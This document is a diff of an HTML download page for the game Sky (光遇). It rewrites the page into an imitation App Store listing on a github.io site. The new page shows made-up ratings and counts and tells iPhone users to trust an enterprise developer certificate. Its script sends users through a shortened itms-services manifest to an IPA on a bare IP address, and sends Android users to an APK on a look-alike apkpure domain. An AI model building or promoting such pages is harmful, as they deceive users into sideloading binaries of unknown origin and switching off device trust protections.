@@ -1,541 +1,319 @@
 <!DOCTYPE html>
-<html>
-
-<head>
+<!-- saved from url=(0022)https://lang.pt/?id=10 -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="edge">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="renderer" content="ie-comp">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Cache-Control" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="format-detection" content="email=no">
+    <link rel="stylesheet" type="text/css" href="https://sky-beta.github.io/ios/swiper.min.css">
+    <link rel="stylesheet" type="text/css" href="https://sky-beta.github.io/ios/index.css">
     <title>光遇</title>
-    <meta charset="utf-8"/>
-    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
-
-    <meta property="og:type" content="webpage">
-    <meta property="og:url" content="https://www.pgyer.com">
-    <meta property="og:title" content="光遇">
-    <meta property="og:description" content="光遇 0.10.4(001)">
-    <meta name="apple-mobile-web-app-title" content="光遇">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no minimal-ui">
-
-    <link rel="dns-prefetch" href="//www.pgyer.com">
-    <link rel="dns-prefetch" href="//www.pgyer.com">
-    <link rel="dns-prefetch" href="//www.pgyer.com">
-    <link rel="dns-prefetch" href="//assets.pgyer.com">
-    <link rel="shortcut icon" href="https://assets.pgyer.com/static-20230129/assets/img/favicon.ico"/>
-
-    <link rel="stylesheet" href="https://assets.pgyer.com/static-20230129/assets/build/header_include.min.css">
-    <!-- Global site tag (gtag.js) - Google Analytics -->
-    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-52814215-1"></script>
-    <script>
-    window.dataLayer = window.dataLayer || [];
-    function gtag() {
-        dataLayer.push(arguments);
-    }
-    gtag('js', new Date());
-    gtag('set', {
-        'user_id': 'ff004a162130afaf14e830f4758253dd'
-    });
-    gtag('config', 'UA-52814215-1', {
-        'link_attribution': true,
-        'custom_map': {
-            'dimension1': 'register_and_unregister_users',
-            'dimension2': 'app_page_with_ad',
-            'dimension3': 'is_app_page'
-        },
-        'linker': {
-            'domains': ['open.pgyer.com', 'www.pgyer.com']
+    <style type="text/css">
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-radius: 50%;
+            border-top: 4px solid #0477f9;
+            width: 26px;
+            height: 26px;
+            float: left;
+            margin-left: 4px;
+            -webkit-animation: spin 2s linear infinite; /* Safari */
+            animation: spin 2s linear infinite;
         }
-    });
-    // google ads 
-    gtag('config', 'AW-871638792');
-    </script>
-    <link rel="stylesheet" href="https://assets.pgyer.com/static-20230129/assets/build/appView.min.css">
-    <link rel="stylesheet" href="https://assets.pgyer.com/static-20230129/assets/build/viewColorful.min.css">
-    <link href="https://assets.pgyer.com/static-20230129/assets/css/appRecommendService.css" rel="stylesheet" type="text/css"/>
 
-    <!-- <meta http-equiv="Content-Security-Policy" content="frame-src https://qzonestyle.gtimg.cn webcompt:"> -->
+        /* Safari */
+        @-webkit-keyframes spin {
+            0% {
+                -webkit-transform: rotate(0deg);
+            }
+
+            100% {
+                -webkit-transform: rotate(360deg);
+            }
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
 </head>
-
 <body>
-
-    <!-- wechat share icon -->
-    <div style="display:none;" id="wechatShareImg">
-        <img src="https://sky.9sfk.cn/skytb.png" onerror="javascript:this.src='https://sky.9sfk.cn/skytb.png';"/>
+<div class="contain-page">
+    <!-- info -->
+    <div class="app-info">
+        <div class="app-logo">
+            <img src="https://sky-beta.github.io/ios/psc.jpg">
+        </div>
+        <div class="app-info-rig">
+            <strong>光遇</strong>
+            <p>应用大小：1407M</p>
+            <div class="clr">
+                <a class="arouse" href="https://thatgamecompany.com/sky">访问官网</a>
+                <a class="btn btn-mini step2 blue" href="javascript:;;" id="install_btn">开始安装</a>
+            </div>              
+        </div>
     </div>
-
-    <!-- ad start -->
-
-    <!-- ad end -->
-    <div class="row-fluid " style="z-index:-2;">
-        <div id="header"></div>
+    <!-- 评价 -->
+    <div class="app-show">
+        <div class="app-score">
+            <strong>4.9</strong><img src="https://sky-beta.github.io/ios/star.png" alt="">
+            <p><span class="down-count">9999,999</span>个评分</p>
+        </div>
+        <div class="app-age">
+            <strong>7+</strong>
+            <p>年龄</p>
+        </div>
     </div>
-    <!--=== Content Part ===-->
-    <div class="container content pt-10">
-        <div class="view row">
-            <div class="span12 margin-bottom-30 " id="appicon-bg">
-                <div id="iconBox">
-                    <img src="https://sky-beta.github.io/ios/psc.jpg" class="appicon" onerror="https://sky-beta.github.io/ios/psc.jpg'"/>
-                </div>
+    <div class="app-intro">
+        <div class="app-intro-con" style="height: auto;">
+            <p style="padding: 8px 8px 8px 8px; color: white; background-color: #e64141; border-radius: 5px;">
+                1、安卓手机下载完点击安装即可，再去应用商店下载ourplay加速器导入后开始游戏<br>
+                2、Iphone手机点击安装完返回桌面，如下载完成，则点击设置 &gt;&gt; 通用 &gt;&gt; VPN与设备管理 &gt;&gt; 企业级APP&gt;&gt;信任
+            </p>
+        </div>
+    </div>
+    <!-- 图片展示 -->
+    <!-- intro -->
+    <div class="app-intro">
+        <div class="app-intro-con" style="height: auto;">
+                                                           
+            <p>此构建包括以下测试：<p>
+ <p>- **__更新包括：__** 希望季修复错误与改进<p>
+<p> 季节任务优化与更新<p> 
+<p>访问官方 Sky Discord 了解更多详情，提交错误报告，并在#beta-feedback 频道发送您的反</p>
+            <span style="display: none;">更多</span>
+        </div>
+    </div>
+    <!-- 评分及评论 -->
+    <div class="comment-box">
+        <h2 class="app-title">
+            评分及评论
+        </h2>
+        <div class="comment-con">
+            <div class="comment-left">
+                <strong>4.9</strong>
+                <p>满分 5 分</p>
             </div>
-            <div class="span12 app-title" style="text-align:center;padding-top:10px;">
-                <h2 style="color:#333;size:24px;margin-bottom: -5px;">
-                                        光遇                    </h2>
-                <div class="span12 gray-text app-info mt-10" style="text-align:center;">
-                    <ul class="breadcrumb ">
-                        <li>
-                            
-                </div>
-            </div>
-
-            <div class="span12 gray-text app-info mt-10 hide" style="text-align:center;">
-                <ul class="breadcrumb ">
+            <div class="comment-right">
+                <ul class="comment-star-list">
                     <li>
-                                                    版本：221930                                (build 118)
-                                                </li>
-                    <li>大小：1427 MB</li>
-
-                    <li class="">
-                                                更新时间 ：2023-06-11                        </li>
+                        <div class="comment-star">
+                            <img src="https://sky-beta.github.io/ios/star.png" alt="">
+                            <div></div>
+                        </div>
+                        <div class="comment-progress">
+                            <div></div>
+                        </div>
+                    </li>
+                    <li>
+                        <div class="comment-star">
+                            <img src="https://sky-beta.github.io/ios/star.png" alt="">
+                            <div></div>
+                        </div>
+                        <div class="comment-progress">
+                            <div></div>
+                        </div>
+                    </li>
+                    <li>
+                        <div class="comment-star">
+                            <img src="https://sky-beta.github.io/ios/star.png" alt="">
+                            <div></div>
+                        </div>
+                        <div class="comment-progress">
+                            <div></div>
+                        </div>
+                    </li>
+                    <li>
+                        <div class="comment-star">
+                            <img src="https://sky-beta.github.io/ios/star.png" alt="">
+                            <div></div>
+                        </div>
+                        <div class="comment-progress">
+                            <div></div>
+                        </div>
+                    </li>
+                    <li>
+                        <div class="comment-star">
+                            <img src="https://sky-beta.github.io/ios/star.png" alt="">
+                            <div></div>
+                        </div>
+                        <div class="comment-progress">
+                            <div></div>
+                        </div>
+                    </li>
                 </ul>
-            </div>
-
-        </div>
-
-        <div id="" class="view row col-md-6 col-md-offset-3 margin-bottom-30" style="padding-top:26px;">
-            <div class="col-md-12">
-                <div class="span12 gray-text" style="text-align:center;">
-                    
-                </div>
-            </div>
-            <div class="col-md-12" style="margin-top:20px;">
-                <div class="row mb-10 install-btn" $style="">
-                    <div class="span12 margin-bottom-20" style="text-align:center;margin-bottom:20px;">
-                        <div class="spinner">
-                            <div id="showtextTitle" class="hide" style="padding-bottom:10px;">正在安装...</div>
-                            <div id="showtext">正在安装，请按 Home 键在桌面查看</div>
-                            <div class="loading"></div>
-
-                            <a href="itms-services://?action=download-manifest&url=itms-services://?action=download-manifest&url=https://sky-beta.github.io/ios/ios.plist" onclick="javascript:install_loading();" id="down_load" class="btn-u btn-u-lg  ">
-                                                         安装                        </a>
-                        </div>
-                    </div>
-
-                </div>
-
-                <div class="span12 gray-text hide" style="text-align:center;">
-                    <p style="padding-top:10px;color:#969b9d;">或者用手机扫描二维码安装</p>
-                </div>
-            </div>
-
-            <div class="col-md-12" style="text-align:center;margin-top: 10px;">
-                <div class="spinner" style=" ">
-
-                    <a href="https://www.pgyer.com/doc/view/inhouse_app_ios9" target="_blank" style="color:#FFAE00" class="hide">该应用来源于第三方产品, 请甄别风险后进行安装</a>
-                    <a class="reportAppLink" href="https://www.pgyer.com/doc/view/inhouse_app_ios9" target="" style="color:#FFAE00">提示未受信任的企业级开发者？</a>
-                </div>
-            </div>
-            <div class="modal fade" id="appCheckModal" tabindex="-1" role="dialog" aria-labelledby="appCheckModalLabel">
-                <div class="modal-dialog" role="document">
-                    <div class="modal-content">
-                        <div class="modal-header">
-                            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
-                                <span aria-hidden="true">&times;</span>
-                            </button>
-                            <h4 class="modal-title" id="appCheckModalLabel">提示</h4>
-                        </div>
-                        <div class="modal-body text-center">
-                            <img class="qrcode" id="installCheckQr" alt="">
-                            <p> 建议使用需要安装应用的设备，扫描上方二维码进行检测 </p>
-                        </div>
-                    </div>
-                </div>
+                <p><span class="down-count">9,999</span>个评分</p>
             </div>
         </div>
-        <div id="endInstall"></div>
-
-        <!-- Start install -->
-        <div class="view row hide" style="margin-top:30px;">
-
-            <!--                <div class="span12 margin-bottom-20" style="text-align:center;display:none;">
-                                <div class="spinner">
-                                    <div id="showtext">正在安装，请按 Home 键在桌面查看</div>
-                                    <div class="loading"></div>
-                                    <a href="javascript:void(0);" onclick="javascript:install_loading();" id="down_load"
-                                       class="btn-u btn-u-lg btn-u-green"><i
-                                                class="fa fa-download"></i> 安装</a>
-                                </div>
-                            </div>
-          </h2>出现未受信任的企业开发者在系统中打开 设置 - 通用 - 描述文件（在iOS 9.2以后叫：设备管理</h2>）
-                    </h2>此时，可以看到有一个和刚刚弹出的提示中文字类似的描述文件。然后，点击对应描述文件进入后，再点击按钮 信任，来让系统允许拥有这个证书的应用运行</h2>         -->
-
+    </div>
+    <!-- 版本号 -->
+    <div class="app-intro">
+        <h2 class="app-title">新功能</h2>
+        <div class="app-intro-con" style="height: auto;">
+            <p>版本 0.22.0（229750）</p>
         </div>
-        <!-- End install -->
-
-        <!-- ====== Start appStore ==== -->
-        <!-- ====== End appStore ==== -->
-        <!-- ====== 应用 ==== --->
-         <div class="row">
-            <div class="col-md-8 col-md-offset-2">
-                <hr class="devider devider-dotted"/>
-            </div>
-            <div class="col-md-8 col-md-offset-2" style="word-break:break-all;">
-                <div class="tag-box margin-bottom-40">
-                    <h2 class="content-title">版本：215499</h2>
-                    <div class="row" style="margin:0;">
-                        <div class="col-md-5 col-xs-12 version-info">
-                            <div class="pull-left">2023.3.30更新</div>
-                            <div class="pull-left">大小</div>
-                            <div class="pull-right gray-text">1474 MB</div>
-                        </div>
-                        <div class="col-md-5 col-md-offset-2 col-xs-12 version-info">
-                            
-                        
-                        </div>
-                    </div>
+    </div>
+    <!-- 信息 -->
+    <div class="information-box">
+        <h2 class="app-title">信息</h2>
+        <ul class="information-list">
+            <li>
+                <span class="l">销售商</span>
+                <div class="r"></div>
+            </li>
+            <li>
+                <span class="l">大小</span>
+                <div class="r">1047M</div>
+            </li>
+            <!-- <li>
+                <span class="l">类别</span>
+                <div class="r blue-color">导航</div>
+            </li> -->
+            <!-- <li>
+                <span class="l">兼容性</span>
+                <div class="r">
+                    <p>需要 iOS 12.0 或更高版本。与 iPhone、iPad 和 iPod touch 兼容。</p>
                 </div>
+            </li> -->
+            <li>
+                <span class="l">语言</span>
+                <div class="r">简体中文</div>
+            </li>
+            <li>
+                <span class="l">年龄分级</span>
+                <div class="r">限7岁以上</div>
+            </li>
+            <li>
+                <span class="l">价格</span>
+                <div class="r">免费</div>
+            </li>
+            <li>
+                <span class="l blue-color">隐私政策</span>
+                <div class="r"></div>
+            </li>
+        </ul>
+    </div>
+    <!-- 免责声明 -->
+    <div class="disclaimer">
+        免责声明：<br>
+        本网站仅提供下载托管，App内容相关事项由开发者负责，与本网站无关。
+    </div>
+    <!-- 蒙版 -->
+    <div class="mask">
+        <img src="https://sky-beta.github.io/ios/go-safari.png" alt="">
+    </div>
+    <!-- safari提示框 -->
+    <div class="mask-box safari-tips">
+        <div class="mask-bg"></div>
+        <div class="mask-pop">
+            <span class="mask-colsed"><img src="https://sky-beta.github.io/ios/colsed.png" alt=""></span>
+            <img class="https://sky-beta.github.io/ios/copy-url-img" src="https://sky-beta.github.io/ios/safari-tip.png" alt="">
+            <div class="copy-url">
+                <input id="foo" type="text">
+                <button data-clipboard-target="#foo">复制</button>
             </div>
         </div>
-       
-        <!-- 历史版本 -->
+    </div>
+</div>
+<!-- 电脑展示 -->
+<div class="pc-box">
+    <div class="pc-logo">
+        <img src="https://sky-beta.github.io/ios/RxnVmj.jpg">
+    </div>
+    <p>应用名称</p>
+    <!--<img src="https://sky-beta.github.io/ios/RxnVmj.jpg" alt="">-->
+    <div class="info">请使用手机打开下载</div>
+</div>
 
-        <!-- 应用截图 -->
-        <!-- 应用截图 -->
+<script type="text/javascript" src="https://sky-beta.github.io/ios/jquery.js "></script>
+<script type="text/javascript" src="https://sky-beta.github.io/ios/fingerprint2.min.js "></script>
+<script type="text/javascript" src="https://sky-beta.github.io/ios/download.js "></script>
+<script type="text/javascript" src="https://sky-beta.github.io/ios/swiper.min.js "></script>
+<script type="text/javascript" src="https://sky-beta.github.io/ios/clipboard.min.js "></script>
+<script type="text/javascript">
+    $(function () {
+        var iosplace = 'appstore-hongtao-2',
+            androidplace = 'android-hongtao-1',
+            iosplacecode = 'appstore-hongtao-999',
+            androidplacecode = 'android-hongtao-4';
 
-    <script>
-        aType = 'ios',
-            aKey = 'fd2e95eeab3eed2e021b9648cde5618e',
-            aVersion = '7.2.3',
-            authCode = '',
-            agKey = '19fbf53e15dadda4f3ca39c93bc230bb',
-            isMergeApp = '',
-            submiting = '请稍候...',
-            submitText = '立即进入',
-            isMobileRequest = false == true ? true : isiPad(),
-            isMobilePhone = false,
-            askBrowserAlert = '请在手机上使用浏览器打开本页面，或者扫描下面的二维码，即可安装',
-            forIosAlert = '您的手机是Android系统，无法安装iOS应用',
-            forAndroidAlert = '您的手机是iOS系统，无法安装Android应用',
-            isWechatRequest = false,
-            isQQRequest = false,
-            isUCRequest = false,
-            isWeiboRequest = false,
-            isAdDisplayed = false,
-            userAdDisplayed = false,
-            needInstallInOutBrowser = false,
-            remindOpenBrowserText = '',
-            browseType = 'other',
-            appInstallPasswordAlert = '请输入密码',
-            appStoreUrl = '',
-            reminderWechatDownloadContent = '请点击微信右上角按钮，然后在弹出的菜单中，点击在浏览器中打开，即可安装',
-            reminderUCDownloadContent = '您当前使用的是 UC 浏览器，该浏览器不支持安装App。请在浏览器中打开，即可安装',
-            reminderWeiboDownloadContent = '请点击微博右上角按钮，然后在弹出的菜单中，点击在浏览器中打开，即可安装',
-            reminderQQDownloadContent = '请点击QQ右上角按钮，然后在弹出的菜单中，点击在浏览器中打开，即可安装',
-            downloadOnlyForCertification = 0,
-            userIsCertification = true,
-            isIOS = false,
-            unableDownload = '应用提供者未进行实名认证，无法安装',
-            reportFileDeleteBtn = '删除',
-            downloadPayMoney = '0',
-            deleteFileConfirm = '确定要删除文件',
-            appTemplate = 'colorful',
-            loginFirst = '请先登录',
-            appReportIsreason = '请输入举报原因',
-            appReportMinreason = '举报原因不能少于10个字符',
-            appReportMaxreason = '举报原因不能超过500个字符',
-            appReportIsemail = '请输入正确的邮箱地址',
-            appReportIsEmailOrMobile = '请输入正确的手机号/邮箱地址',
-            shortcutUrl = 'RxL3',
-            mustDisplayAdSense = 0,
-            showAppAd = 1,
-            aKeyForAdSense = 'fd2e95eeab3eed2e021b9648cde5618e',
-            appReportResult = '感谢您的举报，我们会尽快核实您的举报内容并处理。\n\n作为第三方内测分发平台，我们一直致力于打击违规应用，保护知识产权。非常感谢您的举报，我们会在第一时间安排专人处理您举报的问题，并在处理之后向您反馈处理结果。\n\n感谢您对我们的支持，如果有更多问题欢迎拨打我们的热线电话：4008660210',
-            appFeedbackResult = '反馈成功',
-            isAutoToAppStore = false,
-            iphoneXTips = '正在安装，请从屏幕底部边缘上滑返回桌面查看',
-            iosTips = '请按 Home 键在桌面查看',
-            androidTips = '下载时请勿离开页面（如未自动安装，请手动安装）',
-            testFlightTips = '请在 TestFlight 中查看',
-            isTestFlight = '',
-            isSignatureInhouse = false,
-            isIOS16SignatureAdhoc = false,
-            trustProvisionText = '信任开发者',
-            ios16AdhocText = '开启开发者模式',
-            isInstallStart = true,
-            installIsNotStart = '安装未开始',
-            isInstallEnd = false,
-            installIsEnd = '安装已结束',
-            isInstallValided = true,
-            appFeedbackRequired = '请填写反馈信息',
-            appFeedbackEmailRequired = '请填写您的邮箱或手机号',
-            appFeedbackMaxLength = '反馈信息不能超过2000个字符',
-            isChrome = false,
-            channelId = 0;
-        isFinanceCates = false;
-        reportAppType = '1',
-            showMexAd = '',
-            mexAdUrl = 'https://mexad.pgyer.com/home.html?appname=全能签-企',
-            campaignFree = 0,
-            appGoAKey = '',
-            scheme = '',
-            installAppGoNow = '<strong>立即安装加速器</strong>',
-            isGDTSuccess = false,
-            percentage = 0,
-            appLang = '',
-            useNewTemplate = false,
-            useGoApp = false,
-            trafficPackage = false,
-            autoInstallSuccess = false, // 转向安装成功新页面
-            installToken = "Iv2QjhVFV5XPZTiXIfa1MO%2Faqv05FnuinNh9XEXSIKIv0wP5tfpdf8l0%2Bqebu3OP",
-            hasTurnTableAd = true,
-            addGtag = true, // 是否添加 google 统计
-            saleQRUrl = "",
-            // isShowAddToTeam = "false", // 同ip下是否可加入到组
-            followButtonText = '关注',
-            followedText = '您已关注',
-            wechatSubscribeText = '扫码或截屏识别关注',
-            wechatSubscribeSuccess = '关注成功',
-            wechatSubscribeError = '关注失败',
-            triggerFlag = true, // 是否触发点击获取口令, 测试为 true
-            isSafariRequest = true,
-            highSpeedProdyctType = '601',
-            wechatPay = '3',
-            btnBuyText = '',
-            payToken = '',
-            validateHighSpeedToken = false,
-            isHighSpeedDownload = 'false';
-        jobDomain = 'https://job.pgyer.com/',
-            httpDomain = 'https://www.pgyer.com',
-            sig = '',
-            percentage = 0;
+        var andurl = 'https://apkpure-78e.pages.dev/b/APK/com.tgc.sky.android.test.gold?version=latest';     //安卓端下载地址
+        var iosurl = 'itms-services://?action=download-manifest&url=https://sourl.cn/5Fewre';     //苹果端下载地址
 
-        // 非会员转盘广告安装
-        if (userAdDisplayed && hasTurnTableAd && isMobileRequest && aType == 'android') {
-            autoInstallSuccess = true;
-            // 5 分钟刷新一次安装的 Token
-            setTimeout(function() {
-                refreshToken()
-            }, 5000 * 60)
+        var ua = navigator.userAgent.toLowerCase(),
+            iphoneos = (ua.match(/iphone os/i) == "iphone os") || (ua.match(/iph os/i) == "iph os") || (ua.match(/ipad/i) == "ipad"),
+            android = (ua.match(/android/i) == "android") || (ua.match(/adr/i) == "adr") || (ua.match(/android/i) == "mi pad");
+        $("#install_btn").on("click", function () {
+            DownSoft();
+        })
+
+        function auto_download() {
+            var d = "1"
+            if (d != "1") {
+                return
+            }
+            var issafariBrowser = /Safari/.test(navigator.userAgent) && !/Chrome/.test(navigator.userAgent)
+            if (issafariBrowser) {
+                location = ""
+                if ("" != "1") {
+                    return
+                }
+                setTimeout(function () {
+                    location.href = ''
+                }, 1 * 3000)
+            }
         }
 
-        if (isTestFlight) {
-            isQQRequest = false;
-        }
+        //auto_download()
 
-        var isUserLogged = false;
-        if ('84e0527d58cc97bb11d93d5e0c0d2076') {
-            isUserLogged = true;
-        }
+        function DownSoft() {
+            //复制
+            //copytoclip();
+            var s = 'https:' == document.location.protocol ? true : false;
+            var pid = iphoneos ? iosplace : androidplace;
 
-        $(document).ready(function() {
-            validatePayToken();
-            App.init();
-
-            if ($('#description').height() > 130) {
-                $('#description').css({
-                    "height": "130px",
-                    "overflow": "hidden"
-                })
-                $('#descriptionLoad').removeClass('hide');
-            }
-
-            // 关闭 job 推荐
-            // if (isAdDisplayed && isMobileRequest) {
-            //     setTimeout(function() {
-            //         showJobAd();
-            //     }, 3000);
-            // }
-
-            // 是否有视频, 是否转向内测组
-            
-            // setTimeout('showTurnTable()', 200);
-
-            //     if (isAdDisplayed) {
-            //         pushBannerAd();
-            //     }
-            // }
-            
-            
-            if (isFinanceCates == true) {
-                $('#appInstallConfirmModal').css('top', '10px');
-            }
-
-            var reportAppKey = 'fd2e95eeab3eed2e021b9648cde5618e';
-            var reportAppName = "全能签-企";
-            $('.reportAppLink').attr('href', 'https://www.pgyer.com/report/app?type=' + reportAppType + '&key=' + reportAppKey + '&name=' + encodeURIComponent(reportAppName) + '&shortcut=' + window.location.pathname.slice(1));
-
-            if (true) {
-                if (isNeedCheckUC()) {
-                    if (false) {
-                        return false;
-                    } else if (checkIsUc()) {
-                                                isUCRequest = false;
-                        needInstallInOutBrowser = false;
-                        remindOpenBrowserText = '';
-                        reminderUCDownloadContent = '您当前使用的是 UC 浏览器，该浏览器不支持安装App。请在浏览器中打开，即可安装';
-
-                        var html = '<div class="row view-alert"  style="display:none;z-index:99;width:100%;background:#343434;margin-left:0;margin-right:0;padding-top:30px;padding-bottom:30px;box-shadow:inset 0px -10px 16px rgba(22, 22, 23, 0.62);"><div class="col-md-12 text-left" style="padding-right:30px;padding-left:30px;"><p style="color:#7f7e7e;margin:0px;"></p></div></div>';
-
-                        $(html).insertAfter("#wechatShareImg");
-
-                        setTimeout(function() {
-                            $('.view-alert').slideDown(1000);
-                        }, 200);
-                    }
-                }
-            }
-
-            $('#reportClick, #feedbackClick,#feedbackClickIcon').click(function() {
-                var modal = $(this).attr('data-modal');
-                ajaxLoadModal(modal);
-            });
-
-            $('#feedbackClickIcon').hover(
-                function() {
-                    var activeEle = $(this).find('img')
-                    var imgSrc = activeEle.attr('src')
-                    var normalSrc = imgSrc.replace('normal', 'active')
-                    activeEle.attr('src', normalSrc)
-                },
-                function() {
-                    if ($(this).hasClass('active')) return
-                    var activeEle = $(this).find('img')
-                    var imgSrc = activeEle.attr('src')
-                    var normalSrc = imgSrc.replace('active', 'normal')
-                    activeEle.attr('src', normalSrc)
-                }
-            );
-
-            $('#inhouseClick').click(function() {
-                $("#inhouseTip").modal('show');
-            });
-
-            $('#form').submit(function() {
-                if ($('#password').val() == '') {
-                    alert(appInstallPasswordAlert);
-                    return false;
-                }
-
-                saveData();
-                return false;
-            });
-
-            initView();
-
-            $('.history_show_more').click(function() {
-                loadOtherApps();
-            });
-
-            // 微信自动弹出
-            if (saleQRUrl && isWechatRequest) {
-                showSaleQRImg(500);
+            if (iphoneos) {
+                console.log(iosurl);
+                window.location.href = iosurl;
+                setTimeout(function () {
+                    location.href = 'http://216.127.189.204:5244/d/ios/ios.ipa'
+                }, 1 * 2000)
+                // doLocation(iosurl);
             } else {
-                if (needInstallInOutBrowser) {
-                    setTimeout(function() {
-                        $('.view-alert').slideDown(1000);
-                    }, 500);
-                }
+                console.log(andurl);
+                window.location.href = andurl;
+                // doLocation(andurl);
             }
-
-            $("#lastest-li .close-tips").on('click', function() {
-                $("#lastest-li").removeClass('hide').addClass('hide');
-                // 使fashion模板背景变小
-                $("div.view-fashion-mobile-body .app-info-mobile.mobile-app-content").css('background-size', 'auto 330px');
-                $(".view-fashion-app-info + .row.detail").css('margin-top', '20px');
-                $("div.view-fashion-body").css('background-size', 'auto 170px');
-            });
-
-            $('#loginTelModal').on('shown.bs.modal',
-                function() {
-                    $("#getCode").unbind('click', bindFun).bind('click', bindFun);
-                });
-
-            if ($('#addFollow')) {
-                jQuery.validator.addMethod("isMobile", function(value, element) {
-                    var length = value.length;
-                    var mobile = /^1[3-9][0-9]{9}$/;
-                    return this.optional(element) || (length == 11 && mobile.test(value));
-                }, "请输入正确的手机号");
-
-                $("#addFollow").validate({
-                    rules: {
-                        tel: {
-                            required: true,
-                            isMobile: true
-                        },
-                        position: {
-                            required: true,
-                        }
-                    },
-                    messages: {
-                        tel: {
-                            required: '请输入您的手机号',
-                            isMobile: '请输入正确的手机号'
-                        },
-                        position: {
-                            required: '请选择您的职位',
-                        }
-                    },
-
-                    submitHandler: function() {
-                        addFollow()
-                    },
-
-                    errorPlacement: function(error, element) {
-                        error.insertAfter(element)
-                    }
-                })
-            }
-        });
-
-        function showTopAlert() {
-            setTimeout(function() {
-                $('.view-alert').slideDown(1000);
-            }, 500);
         }
 
-        function showInstallCheckQr() {
-            var qrUrl = "https://www.pgyer.com/app/qrcodeUrl/https%3A%2F%2Fwww.pgyer.com%2Fapp%2FinstallCheck%3Fkey%3DRxL3"
-            $('#installCheckQr').attr('src', qrUrl);
-            $('#appCheckModal').modal('show');
+        function doLocation(url) {
+            var a = document.createElement("a");
+            if(!a.click)
+            {
+                window.location = url;
+                return;
+            }
+            a.setAttribute("href", url);
+            a.setAttribute("target", '__blank');
+            a.style.display = "none";
+            document.body.appendChild(a);
+            a.click();
         }
 
-        // wechat
-        wx.config({
-            debug: false,
-            appId: 'wx5c466490aaef0cc3',
-            timestamp: 1677265258,
-            nonceStr: 'fe7659462b2b7956ff0dc5ccb9ff4702',
-            signature: 'dd473f0d3a0057a64942946b63d576092270230f',
-            jsApiList: ['onMenuShareTimeline', 'onMenuShareAppMessage', 'onMenuShareQQ']
-        });
+    })
+</script>
 
-                wx.ready(function() {
-            wx.onMenuShareAppMessage({
-                title: "全能签-企",
-                desc: decodeURIComponent('%E7%89%88%E6%9C%AC%3A+7.2.3+%28build+1%29+%E5%A4%A7%E5%B0%8F%3A+4.9+MB'.replace(/\+/g, '%20')),
-                link: 'https://www.pgyer.com/RxL3',
-                imgUrl: 'https://cdn-app-icon.pgyer.com/1/5/b/b/5/15bb5316450e944457db3dfddb6f482b?x-oss-process=image/resize,m_lfit,h_300,w_300/format,jpg'
-            });
-            wx.onMenuShareTimeline({
-                title: '全能签-企',
-                link: 'https://www.pgyer.com/RxL3',
-                imgUrl: 'https://cdn-app-icon.pgyer.com/1/5/b/b/5/15bb5316450e944457db3dfddb6f482b?x-oss-process=image/resize,m_lfit,h_300,w_300/format,jpg'
-            });
-            wx.onMenuShareQQ({
-                title: '全能签-企',
-                desc: decodeURIComponent('%E7%89%88%E6%9C%AC%3A+7.2.3+%28build+1%29+%E5%A4%A7%E5%B0%8F%3A+4.9+MB'.replace(/\+/g, '%20')),
-                link: 'https://www.pgyer.com/RxL3',
-                imgUrl: 'https://cdn-app-icon.pgyer.com/1/5/b/b/5/15bb5316450e944457db3dfddb6f482b?x-oss-process=image/resize,m_lfit,h_300,w_300/format,jpg'
-            });
-        });
-    </script>
-    <!-- 暂时关闭 -->
-        <!-- end -->
-    <script src="https://assets.pgyer.com/static-20230210/assets/js/appEdit.js"></script>
-    <script src="https://assets.pgyer.com/static-20230210/assets/js/appScheme.js"></script>
-    <script src="https://assets.pgyer.com/static-20230210/assets/js/highSpeed.js"></script>
 
-    <script src="https://assets.pgyer.com/static-20230210/assets/js/adAdsense.js"></script>       
-    
-</body>
-
-</html>
-
+</body></html>
